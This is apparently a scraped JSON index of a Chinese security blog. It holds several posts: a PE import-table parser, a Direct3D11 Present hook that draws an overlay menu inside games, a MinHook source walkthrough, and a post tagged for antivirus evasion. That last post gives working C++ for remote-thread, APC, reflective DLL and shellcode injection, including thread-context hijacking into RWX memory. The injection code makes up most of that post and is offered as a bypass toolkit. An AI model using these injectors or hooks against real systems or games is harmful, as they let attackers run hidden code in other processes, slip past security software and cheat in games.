std::string filePath = &quot;notepad.exe&quot;; std::ifstream inputFile(filePath, std::ios::in | std::ios::binary); if (!inputFile.is_open()) &#123; std::cerr &lt;&lt; &quot;cant open: &quot; &lt;&lt; filePath &lt;&lt; std::endl; return 1; &#125; std::ostringstream peFileString; peFileString &lt;&lt; inputFile.rdbuf(); std::string fileContent = peFileString.str(); inputFile.close(); IMAGE_DOS_HEADER* dosHeader = (PIMAGE_DOS_HEADER)(DWORD64)(&amp;fileContent[0]); std::cout &lt;&lt; std::hex; std::cout &lt;&lt; &quot;PE e_magic : 0x&quot; &lt;&lt; dosHeader-&gt;e_magic &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot;PE e_lfanew : 0x&quot; &lt;&lt; dosHeader-&gt;e_lfanew &lt;&lt; &quot;\\n&quot;; IMAGE_NT_HEADERS64* ntTempHeader = (PIMAGE_NT_HEADERS64)(DWORD64)(&amp;fileContent[dosHeader-&gt;e_lfanew]); SetConsoleOutputCP(CP_UTF8); std::cout &lt;&lt; &quot;程序位数 : &quot;; if (ntTempHeader-&gt;FileHeader.Machine == 0x8664) std::cout &lt;&lt; &quot;64位\\n&quot;; else if (ntTempHeader-&gt;FileHeader.Machine == 0x014c) std::cout &lt;&lt; &quot;32位\\n&quot;; std::cout &lt;&lt; &quot;区段数量: &quot; &lt;&lt; ntTempHeader-&gt;FileHeader.NumberOfSections &lt;&lt; &quot;\\n&quot;; int nt_head_file_start = dosHeader-&gt;e_lfanew; for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++) &#123; DWORD64 sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); IMAGE_SECTION_HEADER* sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); std::cout &lt;&lt; &quot; Section[&quot; &lt;&lt; i &lt;&lt; &quot;] address: 0x&quot; &lt;&lt; sectionFileAddr &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; name : &quot; &lt;&lt; sectionHeader-&gt;Name &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; VA : 0x&quot; &lt;&lt; sectionHeader-&gt;VirtualAddress &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot; ptr2RawData : 0x&quot; &lt;&lt; sectionHeader-&gt;PointerToRawData &lt;&lt; &quot;\\n&quot;; &#125; std::cout &lt;&lt; &quot;---OptionalHeader.DataDirectories\\n&quot;; std::cout &lt;&lt; &quot;基本重定位表 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot;全局指针的相对虚拟地址 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_GLOBALPTR].VirtualAddress &lt;&lt; &quot;\\n&quot;; std::cout &lt;&lt; &quot;导入地址表 : 0x&quot; &lt;&lt; ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress &lt;&lt; &quot;\\n&quot;; DWORD64 iatDVA = ntTempHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress; DWORD64 iatVA = 0; DWORD64 iatRVA = 0; DWORD64 sectionFileAddr; IMAGE_SECTION_HEADER* sectionHeader; for (size_t i = 0; i &lt; ntTempHeader-&gt;FileHeader.NumberOfSections; i++) &#123; sectionFileAddr = nt_head_file_start + sizeof(IMAGE_NT_HEADERS64) + i * sizeof(IMAGE_SECTION_HEADER); sectionHeader = (PIMAGE_SECTION_HEADER)(DWORD64)(&amp;fileContent[sectionFileAddr]); if (sectionHeader-&gt;VirtualAddress &gt; iatDVA) break; iatVA = sectionHeader-&gt;VirtualAddress; iatRVA = iatDVA - iatVA + sectionHeader-&gt;PointerToRawData; &#125; size_t i = 0; PIMAGE_IMPORT_DESCRIPTOR temp = PIMAGE_IMPORT_DESCRIPTOR((DWORD64)&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR)); for (i = 1; temp-&gt;Name != 0; i++) &#123; DWORD64 VA = dwVAToRVA(temp-&gt;Name, nt_head_file_start, fileContent, ntTempHeader); std::cout &lt;&lt; &quot; DLL: &quot; &lt;&lt; (char*)(&amp;fileContent[VA]) &lt;&lt; &quot;\\n&quot;; VA = *PDWORD64(&amp;fileContent[0] + dwVAToRVA(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader)); for (size_t i = 1; VA != 0; i++) &#123; PIMAGE_IMPORT_BY_NAME IatName = PIMAGE_IMPORT_BY_NAME(&amp;fileContent[0] + dwVAToRVA(VA, nt_head_file_start, fileContent, ntTempHeader)); std::cout &lt;&lt; &quot; -Function &quot; &lt;&lt; IatName-&gt;Name &lt;&lt; std::endl; VA = *PDWORD64(&amp;fileContent[0] + dwVAToRVA(temp-&gt;FirstThunk, nt_head_file_start, fileContent, ntTempHeader) + i * sizeof(DWORD64)); &#125; temp = PIMAGE_IMPORT_DESCRIPTOR(&amp;fileContent[0] + iatRVA + i * sizeof(IMAGE_IMPORT_DESCRIPTOR)); &#125; return 0;&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【破解】使用hook再游戏内部创建菜单栏","slug":"d3d11-hook","date":"2024-10-11T06:12:09.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/10/11/d3d11-hook/","link":"","permalink":"https://joe1sn.eu.org/2024/10/11/d3d11-hook/","excerpt":"学习是对技术的祛魅 公众号：","text":"学习是对技术的祛魅 公众号： 或许我们的公众号会有更多你感兴趣的内容 Direct3D11 注入 在此之前，公众号已经简述了MinHook的原理，那么利用这种原理我们就可以通过hook在d3d编写的游戏中实现窗口 相关代码：https://github.com/Joe1sn/dx11-hook-example Direct3D简述 这里使用ImGui的默认dx11版本示例来讲解，首先d3d的绘制依靠的是windows的窗口(window)，接着是D3D设备、上下文和交换链以及各种绘制方法的d3dAPI传入操作系统和GPU，最后传输到显示器显示，大致如下 那么对于d3d API来说是这样的： 如何显示 那么最后如何得到渲染好的最终帧呢？答案是交换链的 IDXGISwapChain::Present 方法用于呈现最终渲染的帧 https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nn-dxgi-idxgiswapchain 具体参数 https://learn.microsoft.com/zh-cn/windows/win32/api/dxgi/nf-dxgi-idxgiswapchain-present 那么我们可以hook这个函数，然后提交我们要现实的内容，最后再一同显示出来 编写DLL 这里我就是用visual studio 2022 默认的DLL项目 导入imgui和minhook 本篇文章将处理的是dx11版本的d3d，那么如何判断游戏是否使用了该dll呢？一般来说是凭借经验，不过也可以使用CE遍历一下DLL即可 如果发现调用了多种图形API，例如OpenGL，Vulkan等，可查看使用调用对应的呈现最终帧的渲染函数，也可以参考kiero的一些做法，链接：https://github.com/Rebzzel/kiero 那么如何找到该函数呢？别忘了最后的dll是注入到程序中的，那么我们的dll也可以使用d3d11.dll，而且前文提到过IDXGISwapChain::Present是IDXGISwapChain下的方法，那么我们如果也要使用该方法，也是会跳转到同一个位置（因为注入后就是同一个程序了，那么对应的dll的内存也是同一块） 而且Present是虚函数，位置在vtable[8]， 那么可以得到定位函数，这里抄了下imgui例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 定义函数参数typedef long(__stdcall* DIGX_Present)(IDXGISwapChain*, UINT, UINT);DIGX_Present originPresent;DIGX_Present old_present;bool getPresentPtr()&#123; // Setup swap chain DXGI_SWAP_CHAIN_DESC sd; ZeroMemory(&amp;sd, sizeof(sd)); sd.BufferCount = 2; sd.BufferDesc.Width = 0; sd.BufferDesc.Height = 0; sd.BufferDesc.Format = DXGI_FORMAT_R8G8B8A8_UNORM; //sd.BufferDesc.RefreshRate.Numerator = 60; 跟随游戏的fps //sd.BufferDesc.RefreshRate.Denominator = 1; 跟随游戏 sd.OutputWindow = GetForegroundWindow(); // 跟随游戏窗口 sd.SampleDesc.Count = 1; sd.Windowed = TRUE; sd.SwapEffect = DXGI_SWAP_EFFECT_DISCARD; UINT createDeviceFlags = 0; IDXGISwapChain* swap_chain; ID3D11Device* device; D3D_FEATURE_LEVEL featureLevel; const D3D_FEATURE_LEVEL featureLevelArray[2] = &#123; D3D_FEATURE_LEVEL_11_0, D3D_FEATURE_LEVEL_10_0, &#125;; if (D3D11CreateDeviceAndSwapChain( nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, createDeviceFlags, featureLevelArray, 2, D3D11_SDK_VERSION, &amp;sd, &amp;swap_chain, &amp;device, &amp;featureLevel, nullptr) == S_OK) &#123; void** p_vtable = *reinterpret_cast&lt;void***&gt;(swap_chain); //得到虚函数表 swap_chain-&gt;Release(); //释放 device-&gt;Release(); //释放 old_present = (DIGX_Present)p_vtable[8]; //从虚函数表得到present函数 return true; &#125; return false;&#125; 确定下主线程的主要结构 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354//&quot;main&quot; loopint WINAPI main(HMODULE hModule) &#123; // 1.获得函数 if (!getPresentPtr()) return 1; // 2.开始hook // 2.1 hook初始化 if (MH_Initialize() != MH_OK) return 1; // 2.2 创建hook if (MH_CreateHook(reinterpret_cast&lt;void**&gt;(old_present), &amp;myPresent, reinterpret_cast&lt;void**&gt;(&amp;originPresent)) != MH_OK) return 1; // 2.3 启用hook if (MH_EnableHook(old_present) != MH_OK) return 1; // 3.等待 F1 退出 while (true) &#123; Sleep(50); if (GetAsyncKeyState(VK_F1)) &#123; break; &#125; &#125; // 4.退出hook，清理 //Cleanup if (MH_DisableHook(MH_ALL_HOOKS) != MH_OK) return 1; if (MH_Uninitialize() != MH_OK) return 1; FreeLibraryAndExitThread(hModule, 0); return 0;&#125;BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: &#123; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)main, hModule, 0, NULL); &#125; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 完成myPresent来替换旧的Present，这里依旧是抄了写imgui的示例代码，主要还是参考示例代码中的初始化和绘制的步骤 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687WNDPROC oWndProc;// Forward declare message handler from imgui_impl_win32.cppextern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam);// Win32 message handler// You can read the io.WantCaptureMouse, io.WantCaptureKeyboard flags to tell if dear imgui wants to use your inputs.// - When io.WantCaptureMouse is true, do not dispatch mouse input data to your main application, or clear/overwrite your copy of the mouse data.// - When io.WantCaptureKeyboard is true, do not dispatch keyboard input data to your main application, or clear/overwrite your copy of the keyboard data.// Generally you may always pass all inputs to dear imgui, and hide them from your application based on those two flags.LRESULT WINAPI WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) &#123; if (ImGui_ImplWin32_WndProcHandler(hWnd, msg, wParam, lParam)) return true; return ::DefWindowProcW(hWnd, msg, wParam, lParam);&#125;bool init = false;HWND window = NULL;static ID3D11Device* g_pd3dDevice = nullptr;static ID3D11DeviceContext* g_pd3dDeviceContext = nullptr;static ID3D11RenderTargetView* g_mainRenderTargetView = nullptr;static long __stdcall myPresent(IDXGISwapChain* p_swap_chain, UINT sync_interval, UINT flags) &#123; if (!init) &#123; //从swap chain获得device if (SUCCEEDED(p_swap_chain-&gt;GetDevice(__uuidof(ID3D11Device), (void**)&amp;g_pd3dDevice))) &#123; //获得上下文 g_pd3dDevice-&gt;GetImmediateContext(&amp;g_pd3dDeviceContext); // DXGI_SWAP_CHAIN_DESC sd; p_swap_chain-&gt;GetDesc(&amp;sd); window = sd.OutputWindow; ID3D11Texture2D* pBackBuffer; p_swap_chain-&gt;GetBuffer(0, __uuidof(ID3D11Texture2D), (LPVOID*)&amp;pBackBuffer); g_pd3dDevice-&gt;CreateRenderTargetView(pBackBuffer, NULL, &amp;g_mainRenderTargetView); pBackBuffer-&gt;Release(); oWndProc = (WNDPROC)SetWindowLongPtr(window, GWLP_WNDPROC, (LONG_PTR)WndProc); //创建imgui上下文 ImGui::CreateContext(); ImGuiIO&amp; io = ImGui::GetIO(); (void)io; io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard; // Enable Keyboard Controls io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad; // Enable Gamepad Controls ImGui::StyleColorsDark(); ImGuiStyle&amp; style = ImGui::GetStyle(); if (io.ConfigFlags) &#123; style.WindowRounding = 0.0f; style.Colors[ImGuiCol_WindowBg].w = 1.0f; &#125; ImGui_ImplWin32_Init(window); ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext); init = true; &#125; else return originPresent(p_swap_chain, sync_interval, flags); &#125; ImGui_ImplDX11_NewFrame(); ImGui_ImplWin32_NewFrame(); ImGui::NewFrame(); ImGui::ShowDemoWindow(); ImGui::EndFrame(); ImGui::Render(); g_pd3dDeviceContext-&gt;OMSetRenderTargets(1, &amp;g_mainRenderTargetView, nullptr); ImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData()); // Update and Render additional Platform Windows //if (io.ConfigFlags &amp; ImGuiConfigFlags_ViewportsEnable) //&#123; // ImGui::UpdatePlatformWindows(); // ImGui::RenderPlatformWindowsDefault(); //&#125; //// Present //HRESULT hr = g_pSwapChain-&gt;Present(1, 0); // Present with vsync ////HRESULT hr = g_pSwapChain-&gt;Present(0, 0); // Present without vsync //g_SwapChainOccluded = (hr == DXGI_STATUS_OCCLUDED); return originPresent(p_swap_chain, sync_interval, flags);&#125;","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"source","slug":"source","permalink":"https://joe1sn.eu.org/tags/source/"},{"name":"MinHook","slug":"MinHook","permalink":"https://joe1sn.eu.org/tags/MinHook/"}]},{"title":"【免杀】常见的DLL和Shellcode注入方式","slug":"dll-inject","date":"2024-10-01T06:50:28.000Z","updated":"2025-02-27T06:50:41.055Z","comments":true,"path":"2024/10/01/dll-inject/","link":"","permalink":"https://joe1sn.eu.org/2024/10/01/dll-inject/","excerpt":"公众号：https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ","text":"公众号：https://mp.weixin.qq.com/s/qYO0Cf5MRT4vKCT5WYz1KQ 或许我们的公众号会有更多你感兴趣的内容 【免杀】常见的DLL和Shellcode注入方式 这里的dll和shellcode注入指的是动态的注入，及进程运行时的注入 关于代码可以从github仓库找到：https://github.com/Joe1sn/S-inject A. DLL注入 首先回顾一下一个程序是如何加载dll的，使用的是kernel32.dll的LoadLibraryA函数 123HMODULE LoadLibraryA( [in] LPCSTR lpLibFileName); lpLibFileName就是dll文件的路径 由于本篇只是简单的、常见的方法，没有涉及如天堂之门（Heaven’s Gate）等高级技术，需要暂时认为 64位dll只能使用64位注入器注入64位程序，32位也是如此 远程线程调用注入 这里用到的是函数createRemoteThread 函数，主要作用就是再其他进程创建一个新的线程 123456789HANDLE CreateRemoteThread( [in] HANDLE hProcess, [in] LPSECURITY_ATTRIBUTES lpThreadAttributes, [in] SIZE_T dwStackSize, [in] LPTHREAD_START_ROUTINE lpStartAddress, [in] LPVOID lpParameter, [in] DWORD dwCreationFlags, [out] LPDWORD lpThreadId); hProcess：远程进程句柄 lpStartAddress：线程执行的应用程序定义函数的指针，表示远程进程中线程的起始地址。 函数必须存在于远程进程中 lpParameter：对应的参数 那么可以得到思路： 将dll的路径写入远程的进程(待注入的进程) 获得远程进程LoadLibraryA函数的地址 这里有个小小的trick，windows加载核心DLL（如ntdll.dll，kernel32.dll）的时候，相对于内存的位置是固定的，也就是加载到进程的内存是相对固定的，那么我们加载这些dll的内存位置和远程进程的是一样的 使用createRemoteThread 创建新的进程 可以得到如下代码（为了排版，所有代码都会省略掉无关部分） https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L88 123456789101112131415161718192021222324/* Remote Thread Injection */void Injector::RemoteThreadInject(DWORD pid) &#123; SIZE_T dwWriteSize = 0; //1.获得远程进程句柄 HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); //2.在远程进程中创建内存空间，内存RWX LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x100, MEM_COMMIT, PAGE_READWRITE); //3.向2中开辟的内存空间写入dll路径 bRet = WriteProcessMemory(hProcess, pAddress, this-&gt;DllPath.c_str(), this-&gt;DllPath.size() + 1, &amp;dwWriteSize); //4.从ntdll导出 LoadLibraryA 函数 HMODULE Ntdll = LoadLibraryA(&quot;kernel32.dll&quot;); LPVOID LoadLibraryBase = GetProcAddress(Ntdll, &quot;LoadLibraryA&quot;); //5.创建远程进程 HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibraryBase, pAddress, NULL, NULL); //6.等待远程线程执行 WaitForSingleObject(hRemoteProcess, 500); //7.释放资源 VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); FreeModule(Ntdll);&#125; 那么同样的原理，加载完成DLL后，如何卸载该DLL呢？，可以使用windows提供的函数FreeLibrary，具体原理类似，读者不妨自己实现一下 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L156 APC注入 这里就是利用KiUserDispatch调度进行APC例程调用，让线程使用LoadLibarary进行注入 关于Windows APC队列更深入的了解：https://www.anquanke.com/post/id/247813 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L304 123456789101112131415161718192021222324252627282930313233343536void Injector::ApcInject(DWORD pid) &#123; SIZE_T dwWriteSize = 0; HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); LPVOID pAddress = VirtualAllocEx(hProcess, NULL, 0x300, MEM_COMMIT, PAGE_READWRITE); bRet = WriteProcessMemory(hProcess, pAddress, this-&gt;DllPath.c_str(), this-&gt;DllPath.size() + 1, &amp;dwWriteSize); HMODULE Ntdll = LoadLibraryA(&quot;kernel32.dll&quot;); LPVOID LoadLibraryBase = GetProcAddress(Ntdll, &quot;LoadLibraryA&quot;); THREADENTRY32 te = &#123; sizeof(THREADENTRY32) &#125;; HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); BOOL bStat = FALSE; HANDLE hThread = NULL; //得到第一个线程 if (Thread32First(hThreadSnap, &amp;te)) &#123; do &#123; if (te.th32OwnerProcessID == pid) &#123; hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID); //插入APC队列 DWORD dwRet = QueueUserAPC((PAPCFUNC)LoadLibraryBase, hThread, (ULONG_PTR)pAddress); if (dwRet &gt; 0) bStat = TRUE; CloseHandle(hThread); break; &#125; &#125; while (Thread32Next(hThreadSnap, &amp;te)); &#125; VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); CloseHandle(hThreadSnap);&#125; 还有一个技巧就是使用NTDLL中的未导出函数NtTestAlert就可以立即调用APC例程，这个方法的好处就是绕过了createRemoteThread的API调用，使用了QueueUserAPC进行创建，但是可能会出现APC队列阻塞。也是一个比较入门的免杀手法。 上下文注入 如果你之前在写PE加载器的话，那么自然而然的就想到这个，主要是通过暂停程序，获得并修改上下文，在内存中写入shellcode，然后再恢复就行了，这部分为了理解简单会放到shellcode注入中讲解 用到的主要WINAPI就是 创建会shellcode裸函数（__declspec(naked)）,导出LoadLibrary等函数 OpenProcess后再OpenThread，使用SuspendThread暂停线程 创建类型为CONTEXT的变量，初始化context.ContextFlags=CONTEXT_FULL GetThreadContext获得上下文 VirualAlloc获得空间，类似RtlMoveMemory这种复制shellcode到空间 将context.eip = shellcode_addr，使用SetThreadContext重新设置上下文，ResumeThread恢复线程 反射DLL注入 比较复杂的一种方法，也是注入、免杀成功率比较高的一种方法 首先需要了解DLL加载过后的格式，我这里随意举个使用d3d11.dll的例子 神奇的是加载后的DLL在进程内存和文件中的存储是一致的，我们则可以利用这一特性，仿照loadlibaray进行自己函数的装载，这里结合 https://github.com/stephenfewer/ReflectiveDLLInjection 讲解 由于上面的分析可以得到大致步骤 使用CreatFile读取DLL文件，并将内容加载到远程进程 找到指定函数的偏移位置（类似于DllMain） 使用createRemoteThread或者其他方法进行注入 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L205 12345678910111213141516171819202122232425262728void Injector::ReflectInject(DWORD pid) &#123; HANDLE hFile = CreateFileA(this-&gt;DllPath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); DWORD dwFileSize = GetFileSize(hFile, NULL); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); LPVOID pBase = VirtualAllocEx(hProcess, NULL, (SIZE_T)dwFileSize + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE); SIZE_T dwWriteSize = 0; char* buffer = new char[dwFileSize]; DWORD dwReadSize; DWORD dwReflectiveLoaderOffset = this-&gt;dwGetOffset(buffer, (CHAR*)&quot;ReflectiveLoader&quot;); bool bRet = WriteProcessMemory(hProcess, pBase, buffer, dwFileSize, &amp;dwWriteSize); LPTHREAD_START_ROUTINE lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)pBase + dwReflectiveLoaderOffset); HANDLE hThread = CreateRemoteThread(hProcess, NULL, 1024 * 1024, lpReflectiveLoader, pBase, (DWORD)NULL, NULL); WaitForSingleObject(hThread, 500); delete[] buffer; VirtualFreeEx(hProcess, pBase, (SIZE_T)dwFileSize + 1, MEM_COMMIT); CloseHandle(hFile); CloseHandle(hProcess); CloseHandle(hThread);&#125; 关于dwGetOffset函数 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L775 主要是PE文件格式RVA那套东西，本片文章不再赘述 回到反射式注入，我们的DLL并没有直接调用DllMain，而是先调用了ReflectiveLoader这个函数 https://github.com/stephenfewer/ReflectiveDLLInjection/blob/178ba2a6a9feee0a9d9757dcaa65168ced588c12/dll/src/ReflectiveLoader.c#L51 函数主要是从Ldr遍历链上dll，找到一些关键函数例如 123// we stop searching when we have found everything we need.if( pLoadLibraryA &amp;&amp; pGetProcAddress &amp;&amp; pVirtualAlloc &amp;&amp; pNtFlushInstructionCache ) break; 之后利用这个API来加载PE文件，大致步骤就是这样的 最后跳转到映射好的DllMain中执行 这种方法的好处十分明显，在远程进程中进行映射，而且由于只需要将内容写入远程进程，所以适合从网络加载，对免杀有好处。缺点自然就是构造dll较为复杂，因为需要一个loader去加载 B. Shellcode注入 这里复习下远程线程调用注入的步骤 将dll的路径写入远程的进程(待注入的进程) 获得远程进程LoadLibraryA函数的地址 使用createRemoteThread 创建新的进程 有趣的是如果我们在步骤2中传入的不是远程进程LoadLibraryA函数的地址，而是远程的shellcode地址，这让整个情况变得有意思起来，这样就可以使用远程进程加载shellcode了 这里举个例子 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L472 123456789101112131415void Injector::ShellcodeInject(string basedsc, DWORD pid) &#123; BOOL bRet; string shellcode = Base64Decode(basedsc); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); DWORD size = shellcode.size() + 1; LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE); bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), size - 1, NULL); HANDLE hRemoteProcess = CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL); WaitForSingleObject(hRemoteProcess, INFINITE); VirtualFreeEx(hProcess, pAddress, shellcode.size() + 1, MEM_COMMIT); CloseHandle(hProcess);&#125; 好，这里就可以看下关于上下文注入了 https://github.com/Joe1sn/S-inject/blob/1435a43c613c9cdbb07c9cbe4ad956032f9389f9/S-inject/Injector.cpp#L585 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354void Injector::ContextShellcodeInject(string basedsc, DWORD pid) &#123; BOOL bRet; string shellcode = Base64Decode(basedsc); HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid); DWORD size = shellcode.size() + 1; LPVOID pAddress = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE); bRet = WriteProcessMemory(hProcess, pAddress, shellcode.c_str(), size - 1, NULL); shellcode = &quot;\\x00\\x00\\x00\\x00&quot;; THREADENTRY32 te = &#123; sizeof(THREADENTRY32) &#125;; HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); BOOL bStat = FALSE; HANDLE hThread = NULL; DWORD dwRet = 0; CONTEXT context = &#123; 0 &#125;; context.ContextFlags = CONTEXT_CONTROL; //得到第一个线程(main thread) if (Thread32First(hThreadSnap, &amp;te)) &#123; //main thread can not be hijacked while (Thread32Next(hThreadSnap, &amp;te)) &#123; if (te.th32OwnerProcessID == pid) &#123; hThread = OpenThread(PROCESS_ALL_ACCESS, FALSE, te.th32ThreadID); DWORD lpflOldProtect; VirtualProtectEx(hProcess, pAddress, (SIZE_T)size + 1, PAGE_EXECUTE, &amp;lpflOldProtect); dwRet = SuspendThread(hThread); dwRet = GetThreadContext(hThread, &amp;context); CloseHandle(hThread); continue; &#125;#ifdef _WIN64 context.Rip = (DWORD64)pAddress;#else context.Eip = (DWORD)pAddress;#endif // _WIN64 dwRet = SetThreadContext(hThread, &amp;context); ResumeThread(hThread); CloseHandle(hThread); break; &#125; &#125; &#125; VirtualFreeEx(hProcess, pAddress, 0x300, MEM_COMMIT); CloseHandle(hProcess); CloseHandle(hThreadSnap);&#125; 核心代码在于 12345678910111213 dwRet = SuspendThread(hThread); dwRet = GetThreadContext(hThread, &amp;context); CloseHandle(hThread); continue; &#125;#ifdef _WIN64 context.Rip = (DWORD64)pAddress;#else context.Eip = (DWORD)pAddress;#endif // _WIN64 dwRet = SetThreadContext(hThread, &amp;context); ResumeThread(hThread); 和APC注入一样，便利了线程，然后选择一个线程暂停他(SuspendThread)，然后获得当前线程的上下文，上下文包含了寄存器信息，然后我们就该他的ip寄存器，这样恢复线程后的，下一条指令就是我们的shellcode的地方。","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"bypass","slug":"bypass","permalink":"https://joe1sn.eu.org/tags/bypass/"}]},{"title":"【源码分析】MinHook源代码分析","slug":"minhook-source","date":"2024-07-24T07:44:48.000Z","updated":"2025-01-26T14:46:00.784Z","comments":true,"path":"2024/07/24/minhook-source/","link":"","permalink":"https://joe1sn.eu.org/2024/07/24/minhook-source/","excerpt":"世界上果然没有魔法，到最后发现都是魔术 解读的项目地址：https://github.com/TsudaKageyu/minhook 公众号：https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw","text":"世界上果然没有魔法，到最后发现都是魔术 解读的项目地址：https://github.com/TsudaKageyu/minhook 公众号：https://mp.weixin.qq.com/s/Po_t-JGj0e3dMBKDd9i8cw 或许我们的公众号会有更多你感兴趣的内容 P1. Hook原理 首先使用Visual Studio中的MSVC编译器，按照Release x64 禁用代码优化 编译如下代码 1234567891011#include &lt;Windows.h&gt;#include &lt;iostream&gt;void hello() &#123; std::cout &lt;&lt; &quot;123\\n&quot;;&#125;int main() &#123; hello(); return 0;&#125; 我们在main函数中的hello()处加上断点（ps:为什么选择了release版本任然能够调试：1.没有antiDebug。2.调式符号依然保存了。3.代码量小,就算开了代码优化也不会有较大影响） 步入call汇编 这里就是目前编译情况下的hello函数的汇编实现了。 那么我们就可以找到hello函数的地址，然后覆盖他的汇编，让执行流转移到我们创建的新的函数。所以我们继续写有如下代码 123456789101112131415161718192021222324252627#include &lt;Windows.h&gt;#include &lt;iostream&gt;void hello() &#123; std::cout &lt;&lt; &quot;123\\n&quot;;&#125;void newhello() &#123; std::cout &lt;&lt; &quot;This is New hello\\n&quot;;&#125;int main() &#123; unsigned char jmpopcode[14] = &#123; 0x68, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x04, 0x00, 0x00, 0x00,0x00, 0xC3 &#125;; DWORD64 oldFuncAddr = reinterpret_cast&lt;DWORD64&gt;(hello); DWORD64 newFuncAddr = reinterpret_cast&lt;DWORD64&gt;(newhello); DWORD old; VirtualProtect(hello, 15, PAGE_EXECUTE_READWRITE, &amp;old); *(DWORD32*)(jmpopcode + 1) = (DWORD32)newFuncAddr; *(DWORD32*)(jmpopcode + 9) = (DWORD32)(newFuncAddr &gt;&gt; 32); memcpy(hello, jmpopcode, 14); hello(); return 0;&#125; 依然是调用hello()的使用跟进去 执行到00007FF7FED8100D，会跳转到我们的函数newhello() 这样我们就完成了一次hook，后续无论调用多少次hello函数，都会执行为newhello函数 关于我们这里的代码 1234567 unsigned char jmpopcode[14] = &#123; 0x68, 0x00, 0x00, 0x00, 